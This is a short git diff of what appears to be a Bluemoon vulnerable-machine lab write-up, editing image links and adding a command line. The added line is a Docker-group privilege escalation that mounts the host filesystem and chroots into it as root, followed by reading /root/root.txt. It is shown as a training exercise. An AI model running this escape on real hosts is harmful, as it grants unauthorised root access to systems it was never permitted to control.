@@ -111,13 +111,11 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 
 ![Root Access](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/d5a5b6ad27ce0ba451ce2443498d3f6d40f46b39/bluemoon%208-2.png)
 
+docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 whoami
-
-![Root](images/root.png)
-
 cat /root/root.txt
 
-![Root Flag](images/root-flag.png)
+![Root Flag](https://github.com/izzulharith02/Week-2---Vulnerable-Machine-Bluemoon/blob/29d5623a7fcd6955b8059d45128655a490173998/bluemoon%208-3%20final.png)
 
 ---
 
